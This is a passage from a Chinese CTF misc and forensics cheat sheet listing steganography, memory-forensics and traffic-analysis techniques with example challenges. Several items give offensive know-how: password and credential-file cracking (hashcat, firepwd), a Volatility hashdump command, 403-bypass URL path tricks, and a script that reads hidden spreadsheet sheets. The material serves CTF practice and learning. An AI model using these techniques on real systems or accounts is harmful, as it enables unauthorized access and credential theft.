<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LEOGG321/p/14493327.html">zip明文攻击</a>，<a target="_blank" rel="noopener" href="https://www.aloxaf.com/2019/04/zip_plaintext_attack/">原理</a>。明文攻击可以用<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43778378/article/details/106077774">archpr</a>跑。archpr里面选好加密的zip文件后攻击类型选明文，然后点到明文，明文文件路径选择包含明文内容的zip（没错是zip，不是写有明文的txt，是装有明文的txt的zip）。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46230755/article/details/112108707">[ACTF新生赛2020]明文攻击</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/87919817">零宽字符隐写</a>。<a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">解密网站</a></li>
<li>010Editor找到工具-&gt;十六进制运算-&gt;二进制异或，可以直接对整个文件异或。</li>
<li>gaps+montage工具自动拼图。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109649446">[MRCTF2020]不眠之夜</a></li>
<li>汉信码，形如：</li>
</ol>
<p><img src="C:/Users/a1348/Desktop/NoobCTF-main/笔记/images/hanxin_code.png" alt="hanxin_code"></p>
<p>可用<a target="_blank" rel="noopener" href="https://tuzim.net/hxdecode/">网站</a>解码。</p>
<ol start="43">
<li><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/06/20/misc-%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99/">snow隐写</a>，有<a target="_blank" rel="noopener" href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">网页版</a>和<a target="_blank" rel="noopener" href="https://darkside.com.au/snow/">exe版</a>。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53105813/article/details/127896201">看雪看雪看雪</a>。如果不知道密码，还可以尝试爆破，使用工具:<a target="_blank" rel="noopener" href="https://github.com/0xHasanM/SnowCracker">SnowCracker</a>。例题:<a target="_blank" rel="noopener" href="https://github.com/daffainfo/ctf-writeup/tree/main/GREP%20CTF%202023/Arctic%20Penguin">Arctic Penguin</a></li>
<li>图片隐写工具<a target="_blank" rel="noopener" href="https://github.com/dhsdshdhk/stegpy">stegpy</a>。</li>
<li>ppt文档密码爆破工具。可用<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-82569-1-1.html">Accent OFFICE Password Recovery</a>工具，也能用<a target="_blank" rel="noopener" href="https://fossies.org/linux/john/run/office2john.py">ffice2john.py</a>或者john。</li>
<li>电动车钥匙信号PT224X解码。例题:<a href="../../CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Misc/%E6%89%93%E5%BC%80%E7%94%B5%E5%8A%A8%E8%BD%A6.md">打开电动车</a>。类似的还有PT226x。例题:<a target="_blank" rel="noopener" href="https://www.onctf.com/posts/d228f8e5.html#%E4%B8%80%E7%99%BE%E5%9B%9B%E5%8D%81%E5%85%AD%E3%80%81-HDCTF2019-%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90">[HDCTF2019]信号分析</a></li>
<li>TSL协议需要私钥（RSA）解密才能追踪。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45699846/article/details/123529342">[DDCTF2018]流量分析</a></li>
<li>VoIP——基于IP的语音传输（英语：Voice over Internet Protocol，缩写为VoIP）是一种语音通话技术，经由网际协议（IP）来达成语音通话与多媒体会议，也就是经由互联网来进行通信。其他非正式的名称有IP电话（IP telephony）、互联网电话（Internet telephony）、宽带电话（broadband telephony）以及宽带电话服务（broadband phone service）。在wireshark中可以根据数据包还原语音。菜单栏-&gt;Telephony-&gt;VoIP Calls。</li>
<li>SSTV音频解码。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109882441">[UTCTF2020]sstv</a></li>
<li>图片缺少IDAT标识时,在010 Editor中将缺少标识的chunk的union CTYPE type的位置补上IDAT十六进制标识49 44 41 54即可。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/107737687">[湖南省赛2019]Findme</a></li>
<li>BPG图片可用<a target="_blank" rel="noopener" href="https://en.bandisoft.com/honeyview/">honeyview</a>打开。</li>
<li>内存取证工具<a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility">Volatility</a>。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109853022">[HDCTF2019]你能发现什么蛛丝马迹吗</a></li>
<li>某些思路邪门的题里，图片的颜色十六进制号可能是flag的十六进制编码。</li>
<li><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/G%E4%BB%A3%E7%A0%81/2892251">GCode</a>,形如：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">M73 P0 R2</span><br><span class="line">M201 X9000 Y9000 Z500 E10000</span><br><span class="line">M203 X500 Y500 Z12 E120</span><br><span class="line">M204 P2000 R1500 T2000</span><br><span class="line">M205 X10.00 Y10.00 Z0.20 E2.50</span><br><span class="line">M205 S0 T0</span><br><span class="line">M107</span><br><span class="line">M115 U3.1.0</span><br><span class="line">M83</span><br><span class="line">M204 S2000 T1500</span><br><span class="line">M104 S215</span><br><span class="line">M140 S60</span><br><span class="line">M190 S60</span><br><span class="line">M109 S215</span><br><span class="line">G28 W</span><br><span class="line">G80</span><br><span class="line">G1 Y-3.0 F1000.0</span><br><span class="line">G92 E0.0</span><br><span class="line">G1 X60.0 E9.0  F1000.0</span><br><span class="line">M73 P4 R1</span><br><span class="line">G1 X100.0 E12.5  F1000.0</span><br><span class="line">G92 E0.0</span><br><span class="line">M900 K30</span><br><span class="line">G21</span><br><span class="line">G90</span><br><span class="line">M83</span><br><span class="line">G92 E0.0</span><br><span class="line">G1 E-0.80000 F2100.00000</span><br><span class="line">G1 Z0.600 F10800.000</span><br><span class="line">G1 X89.987 Y95.416</span><br><span class="line">G1 Z0.200</span><br><span class="line">G1 E0.80000 F2100.00000</span><br></pre></td></tr></table></figure>

<ol start="55">
<li>FAT文件可以使用<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/veracrypt/">VeraCrypt</a>进行挂载</li>
<li>FAT文件在挂载输入密码的时候，不同的密码可以进入不同的文件系统</li>
<li>遇见vmdk文件，可以试试使用7z这个压缩软件打开，里面可能藏着其他文件。</li>
<li>邮件协议：POP、SMTP、IMAP</li>
<li>火狐浏览器的登陆凭证文件可用<a target="_blank" rel="noopener" href="https://github.com/lclevy/firepwd">Firepwd</a>破解。</li>
<li>ext4文件系统可用<a target="_blank" rel="noopener" href="https://extundelete.sourceforge.net/">extundelete</a>恢复被删除的目录或文件。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/110004817">[XMAN2018排位赛]file</a></li>
<li>文件类型识别工具TrID（可识别Python Pickle序列号数据）。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangjin7356/article/details/122471475">我爱Linux</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cgsecurity.org/wiki/TestDisk_CN">TestDisk</a>磁盘恢复工具。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/110079540">[BSidesSF2019]diskimage</a></li>
<li>usb数据提取+autokey爆破。例题:<a target="_blank" rel="noopener" href="https://ctf-wiki.org/en/misc/traffic/protocols/usb/#_2">[XMAN2018排位赛]AutoKey</a></li>
<li><a target="_blank" rel="noopener" href="https://eprint.iacr.org/2020/301.pdf">toy加密</a>。例题:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/vuclw/p/16424799.html">[羊城杯 2020]signin</a></li>
<li>ALPHUCK一种 Programming Language ,只由 a,c,e,i,j,o,p,s 这 8 个小写字母组成。</li>
<li><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%89%E5%88%86%E5%AF%86%E7%A0%81/2250183">三分密码</a>+veracrypt挂载被加密磁盘。例题:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/vuclw/p/16428558.html">[GKCTF 2021]0.03</a></li>
<li>条形码修复。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/zippo1234/article/details/109249593">[BSidesSF2020]barcoder</a></li>
<li>TLS协议需要解密才能追踪。菜单栏-&gt;Wireshark-&gt;Preferences-&gt;Protocols-&gt;TLS。有RSA私钥选RSA key list，有sslkey的log文件在下方log filename选择log文件。log文件里的格式不一定相同，注意后缀名log。</li>
<li>TCP-IP数据报的Identification字段隐写。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45699846/article/details/123833160">[羊城杯 2020]TCP_IP</a></li>
<li>小米手机的备份文件实际也是ANDROID BACKUP文件，去掉小米的header后即可使用<a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor">脚本</a>解压。</li>
<li>rpg maker修改游戏。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49354488/article/details/115655115">[*CTF2019]She</a></li>
<li>ARCHPR无法爆破RAR5，可以用rar2john提取hash后利用hashcat爆破密码。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/118422921">[羊城杯 2020]image_rar</a></li>
<li>字符串经过brainfuck加密后应该是++++++++[开头的，所以遇见解出来是乱码的brainfuck可以看看开头是否正确。</li>
<li>空格+tab隐写过滤脚本</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv14000314">例题及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_list</span>(<span class="params">dir_path</span>):</span><br><span class="line">    _file_list = os.listdir(dir_path)</span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> file_str <span class="keyword">in</span> _file_list:</span><br><span class="line">        new_dir_path = dir_path+<span class="string">&#x27;/&#x27;</span>+file_str</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(new_dir_path):</span><br><span class="line">            file_list.extend(get_file_list(new_dir_path))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_list.append(new_dir_path)</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line">file_list = get_file_list(<span class="string">r&#x27;/Users/constellation/Desktop/source_code&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> file_str <span class="keyword">in</span> file_list:</span><br><span class="line">    f = <span class="built_in">open</span>(file_str, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = f.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27; \t \t&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(file_str)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<ol start="75">
<li>swf文件是flash文件，可用<a target="_blank" rel="noopener" href="https://github.com/jindrapetrik/jpexs-decompiler">JPEXS Free Flash Decompiler</a>反编译。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115833842">[*CTF2019]babyflash</a></li>
<li>音频lsb提取。例题将一张bmp图片通过lsb的形式写入音频，需要知道正确的宽高才能恢复原来的图片。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45699846/article/details/123847848">静静听这么好听的歌</a></li>
<li><a target="_blank" rel="noopener" href="https://www.pos-shop.ru/upload/iblock/ebd/ebd9bed075d1b925be892b297590fc18.pdf">TSPL&#x2F;TSPL2 Programming Language</a>，用于打印机。例题:<a target="_blank" rel="noopener" href="https://tobatu.gitee.io/blog/2020/10/06/BUUCTF-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-9/#RCTF2019-printer">[RCTF2019]printer</a></li>
<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D">北约音标字母</a>，Alfa，Bravo之类的，其实就是每个单词的首字母。</li>
<li>pgp加密，使用<a target="_blank" rel="noopener" href="https://pgptool.github.io/">PGPTool</a>解密。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115856882">[BSidesSF2019]bWF0cnlvc2hrYQ</a></li>
<li>镜像FTK挂载仿真，使用<a target="_blank" rel="noopener" href="https://iowin.net/en/ftk-imager/?download=true">AccessData FTK Imager</a>。例题:<a target="_blank" rel="noopener" href="https://shimo.im/docs/6hyIjGkLoRc43JRs">[NPUCTF2020]回收站</a></li>
<li>利用<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/418787">dig</a>命令分析dns shell。例题:<a target="_blank" rel="noopener" href="https://meowmeowxw.gitlab.io/ctf/utctf-2020-do-not-stop/">[UTCTF2020]dns-shell</a></li>
<li>乐高ev3机器人分析（蓝牙协议）。基本的4个协议为HCI、L2CAP、SDP、RFCOMM。对比于英特网五层结构来说：HCI相当于与物理层打交道的协议，L2CAP协议则是链路层相关协议，SDP和RFCOMM则是运输层相关协议，当然其上也有对应的应用层相关的一些协议。SDP用来发现周围蓝牙服务，然后由L2CAP来建立信道链接，然后传输由上层RFCOMM给予的数据分组。如果只是提取数据的话，只需要关心：RFCOMM协议。例题:<a target="_blank" rel="noopener" href="https://www.youncyb.cn/?p=493">[HITCON2018]ev3basic</a></li>
<li>使用<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-e2fsck.html">e2fsck</a>命令修复超级块损坏的ext2文件。例题:<a target="_blank" rel="noopener" href="http://www.ga1axy.top/index.php/archives/17/">[BSidesSF2020]mpfrag</a></li>
<li>压感数位板usb协议分析+emoji aes密码。例题:<a target="_blank" rel="noopener" href="http://www.ga1axy.top/index.php/archives/43/">[RoarCTF2019]davinci_cipher</a></li>
<li><a target="_blank" rel="noopener" href="https://www.rmnof.com/article/exiftool-introduction/">exiftool</a>使用。当用exiftool发现有<code>ThumbnailImage	(Binary data 215571 bytes, use -b option to extract)</code>一项时，可以用<code>exiftool -b -ThumbnailImage attachment.jpg &gt; flag.jpg</code>提取出缩略图。例题:<a target="_blank" rel="noopener" href="https://www.shawroot.cc/142.html">[BSidesSF2019]delta</a>，这题还有条形码分析。</li>
<li>Discord服务器link泄露。可用下方的代码插入一个iframe，强制加入服务器。</li>
</ol>
<p>例题及来源:<a target="_blank" rel="noopener" href="https://github.com/uclaacm/lactf-archive/tree/main/2023/misc/discord-leak">discord l34k</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 1. Copy Discord embed iframe template (visit any server Server Settings -&gt; Widget -&gt; Premade Widget). --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 2. Replace id with id from prompt. --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 3. Open this file up in a browser. --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 4. Click &quot;Join Discord&quot; to access the server. --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://discord.com/widget?id=1060030874722259057&amp;theme=dark&quot;</span> <span class="attr">width</span>=<span class="string">&quot;350&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">allowtransparency</span>=<span class="string">&quot;true&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="87">
<li>利用Google Sheets API获取被保护、隐藏的sheet内容。需要在<a target="_blank" rel="noopener" href="https://www.google.com/script/start/">这里</a>运行。</li>
</ol>
<p>例题及来源:<a target="_blank" rel="noopener" href="https://github.com/uclaacm/lactf-archive/tree/main/2023/misc/hidden-in-plain-sheets">hidden in plain sheets</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> sheet = <span class="title class_">SpreadsheetApp</span>.<span class="title function_">openById</span>(<span class="string">&quot;1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> sheets = sheet.<span class="title function_">getSheets</span>();</span><br><span class="line">  <span class="keyword">const</span> secret = sheets.<span class="title function_">find</span>(<span class="function"><span class="params">x</span> =&gt;</span> x.<span class="title function_">getName</span>() == <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(secret.<span class="title function_">getDataRange</span>().<span class="title function_">getValues</span>().<span class="title function_">map</span>(<span class="function"><span class="params">l</span> =&gt;</span> l.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="88">
<li>智能汽车协议分析+arm可执行文件逆向。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/106156567">[网鼎杯 2020 青龙组]Teslaaaaa</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-4.0/tree/main/ow">ow</a> &amp; <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011297466/article/details/81059248">[QCTF2018]Noise</a></li>
</ol>
<ul>
<li>利用相位抵消分离特殊信号。具体步骤如下：<ul>
<li>将想要分离的噪音与有用的音频分开。有些题会给出噪音的原音频（不包含有用信息，这样可以直接相位反转后抵消），有的题则是分声道：噪音与音频分别为左右声道。audacity如何分离声道：在切换频谱图同样的菜单栏里有“分割立体声轨道选项”，点击后即能看到左右声道</li>
<li>左右两声道的的平移滑块都滑到“置中”</li>
<li>选中噪音声道，菜单栏效果-&gt;Special-&gt;倒转（上下）即可翻转噪音相位</li>
<li>将反转后的噪音声道与混合噪音的音频声道同时播放，即可获取原音频</li>
</ul>
</li>
<li>不用audacity而是使用<a target="_blank" rel="noopener" href="https://github.com/jiaaro/pydub">pydub</a>模块：</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydub <span class="keyword">import</span> AudioSegment</span><br><span class="line">song = AudioSegment.from_mp3(<span class="string">&quot;./ow.mp3&quot;</span>)</span><br><span class="line"><span class="comment"># Extract left and right channels from stereo mp3</span></span><br><span class="line">left_channel = song.split_to_mono()[<span class="number">0</span>]</span><br><span class="line">right_channel = song.split_to_mono()[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># Invert phase of the Right channel</span></span><br><span class="line">inverted_right_channel = right_channel.invert_phase()</span><br><span class="line"><span class="comment"># Merge left and inverted right channels</span></span><br><span class="line">flag = left_channel.overlay(inverted_right_channel)</span><br><span class="line">flag.export(<span class="string">&quot;./flag.mp3&quot;</span>, <span class="built_in">format</span>=<span class="string">&quot;mp3&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>直接用audacity自带的除噪功能（效果没有前两个好，但是能听到）：<a target="_blank" rel="noopener" href="https://github.com/m4karoni/CTF/tree/main/BCACTF/2023/Forensics#owvolume-warning">https://github.com/m4karoni/CTF/tree/main/BCACTF/2023/Forensics#owvolume-warning</a></li>
</ul>
<ol start="90">
<li>Wireshark菜单栏-&gt;Statistics-&gt;Conversations可以看到抓到的包的所有通信的ip和端口号，有时候是流量题找ip的捷径。</li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Whitespace_(programming_language)">WHITESPACES LANGUAGE</a>，由空格，tab键等字符组成，不可见。</li>
<li><a target="_blank" rel="noopener" href="https://www.dcode.fr/hexahue-cipher">hexahue cipher</a>，形如：</li>
</ol>
<p><img src="C:/Users/a1348/Desktop/NoobCTF-main/笔记/images/hexahue.png" alt="hexahue"></p>
<ol start="93">
<li>windows powershell历史记录文件路径：<code>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code>。</li>
<li>对于未经改动过的linux vmem dump，可以直接用strings+grep过滤出操作系统（operating system）和内核版本（kernel version）：</li>
</ol>
<ul>
<li>strings PVE.vmem | grep -i “Linux version”</li>
<li>grep -a “BOOT_IMAGE” dump.mem （更详细的内核版本）</li>
</ul>
<p>操作系统版本号：</p>
<ul>
<li>grep -a “Linux release” dump.mem</li>
</ul>
<ol start="95">
<li><p>遇到volatility不默认支持的image时，可以通过94条的方法手动获得版本，然后去官网下载对应的镜像，存到<code>volatility\plugins\overlays\linux</code>中。现在再用插件就能获取到信息了。例题:<a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">PVE</a>，这题也介绍了volatility的初步使用方法。补充更多例题：<a target="_blank" rel="noopener" href="https://hackmd.io/@TuX-/BkWQh8a6i#ForensicsWanna-1">Wanna</a></p>
</li>
<li><p>403 bypass的特殊技巧。一般是在路径上做手脚，例如：</p>
</li>
</ol>
<ul>
<li><a target="_blank" rel="noopener" href="http://20.121.121.120/*/secret.php">http://20.121.121.120/*/secret.php</a></li>
<li><a target="_blank" rel="noopener" href="http://20.121.121.120/secret.php">http://20.121.121.120/./secret.php</a></li>
<li><a target="_blank" rel="noopener" href="http://20.121.121.120/%2f/secret.php">http://20.121.121.120/%2f/secret.php</a></li>
</ul>
<p>等。一个局限性较大的技巧是去<a target="_blank" rel="noopener" href="https://archive.org/web/">Wayback Machine</a>搜对应网址。要求题目网址提前上线过。</p>
<ol start="97">
<li><a target="_blank" rel="noopener" href="https://osintframework.com/">OSINT思维导图</a>。</li>
<li>某些电子邮件的密码可能在<a target="_blank" rel="noopener" href="https://pastebin.com/">pastebin</a>泄露。</li>
<li><a target="_blank" rel="noopener" href="https://esolangs.org/wiki/Fish">Fish</a>编程语言+<a target="_blank" rel="noopener" href="https://gist.github.com/anonymous/6392418">解释器</a>。例题:<a target="_blank" rel="noopener" href="https://github.com/ZorzalG/the-big-MHSCTF2023-writeups/blob/main/Flowers.md">Flowers</a></li>
<li>Powershell命令历史存储于ConsoleHost_history.txt。</li>
<li>volatility3使用。关于volatility的教程大多都是volatility2的，记录一些平时看到的命令。注意镜像（如img后缀）和内存（如mem）后缀是不同的，工具不能混用。比如volatility就不能用来分析镜像。(volatility3似乎没有找profile的插件，只能用volatility2找：<code>python2 vol.py -f ctf.raw imageinfo</code>)</li>
</ol>
<ul>
<li>python3 vol.py -f Memdump.raw windows.filescan.FileScan<ul>
<li>搜寻Memdump.raw中的文件,会给出文件对应的偏移</li>
</ul>
</li>
<li>python3 vol.py -f Memdump.raw windows.dumpfiles.DumpFiles –virtaddr(<code>--physaddr</code>) 0xc88f21961af0<ul>
<li>根据文件偏移提取文件</li>
</ul>
</li>
<li>python3 vol.py -f mem.raw windows.cmdline.CmdLine<ul>
<li>cmd中运行的命令</li>
</ul>
</li>
<li>python3 vol.py -f mem.raw windows.info<ul>
<li>显示windows镜像信息。用例： <a target="_blank" rel="noopener" href="https://j-0k3r.github.io/2024/01/23/KnightCTF%202024/">https://j-0k3r.github.io/2024/01/23/KnightCTF%202024/</a></li>
</ul>
</li>
<li>python3 vol.py -f mem.raw windows.netstat<ul>
<li>查看网络连接状况（可用于获取本机ip）</li>
</ul>
</li>
<li>python3 vol.py -f mem.raw windows.registry.hivelist.HiveList<ul>
<li>查看注册表</li>
</ul>
</li>
<li>python3 vol.py -f mem.raw windows.registry.printkey.PrintKey –offset 0xf8a0000212d0<ul>
<li>通过上一步获取到注册表后，根据获得的偏移进一步获取键名信息。</li>
</ul>
</li>
<li>python3 vol.py -f mem.raw windows.registry.printkey.PrintKey –offset 0xf8a0000212d0 –key “ControlSet001\Control\ComputerName\ComputerName”  <ul>
<li>可以一直沿着获取的键名走下去。上面的命令用于获取主机名。详情见<a target="_blank" rel="noopener" href="https://www.bnessy.com/archives/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-volatility">此处</a>,内含基础例题。</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/forensics/dumpster-dive">Dumpster Dive</a><ul>
<li>linux.bash for bash history</li>
<li>linux.pslist to get pid of processes</li>
<li>linux.proc has a dump option, <code>linux.proc --pid &lt;pid&gt; --dump</code></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://pakcyberbot.github.io/CTF-Writeups/posts/BHME-NotSupported/">Not supported</a><ul>
<li><code>vol -f file.mem windows.memmap.Memmap --pid &lt;num&gt; --dump</code>:dump pid为num的进程的内容。有意思的地方在于，Memdumps are essentially RAM moment captures，可以将dump出来的文件后缀改成.data放进GIMP，能看到内存的图片，包括字符串形式的flag。参考 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-E3VTblFkKg">https://www.youtube.com/watch?v=-E3VTblFkKg</a></li>
<li>另一道使用这个技巧的题的图文wp：<a target="_blank" rel="noopener" href="https://warlocksmurf.github.io/posts/l3akctf2024">Pixelated</a>和<a target="_blank" rel="noopener" href="https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html">参考文章</a>，更详细一点</li>
<li>另外，如果要grep dump出来的memory，记得用<code>strings * -e l</code>，因为dump出来的内容都是小端的(但有的时候直接grep也行)</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/daffainfo/ctf-writeup/tree/main/2023/niteCTF%202023/conqueror">conqueror</a><ul>
<li><code>vol -f ctf.mem windows.hashdump.Hashdump</code>:dump用户及其md5 hash</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://odintheprotector.github.io/2024/02/17/bitsctf2024-dfir.html">Bypassing Transport Layer</a><ul>
<li><code>vol.py -f ctf.mem windows.netscan</code>:查看网络连接情况</li>
<li>TLS流的requests和responses都是加密的，解密需要密钥。若找到类似keylog.pcapng的文件也可以解密</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2024/02/27/Forensics/BatmanInvestigationII-GothamUndergroundCorruption-bi0sCTF2024/">Batman Investigation II</a><ul>
<li><code>vol -f ctf.raw windows.pslist.PsList</code>:List active process list</li>
<li><code>vol -f ctf.raw windows.mftscan.MFTScan</code>:获取<a target="_blank" rel="noopener" href="https://www.sciencedirect.com/topics/computer-science/master-file-table">MFT</a>文件</li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Tokeii0/LovelyMem">LovelyMem</a>:一个图形界面取证工具</li>
</ul>
<ol start="102">
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Huffman_coding">Huffman coding</a>，例题:<a target="_blank" rel="noopener" href="https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4">Tree of Secrets</a>,例题是文件夹形式的Huffman coding。动图解释：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/63362804">https://zhuanlan.zhihu.com/p/63362804</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/5t0n3/ctf-writeups/blob/main/2023-lactf/misc/private-bin/README.md">private-bin</a></li>
</ol>
<ul>
<li>分析end to end（e2e）加密（HTTPS，TLS）pcapng</li>
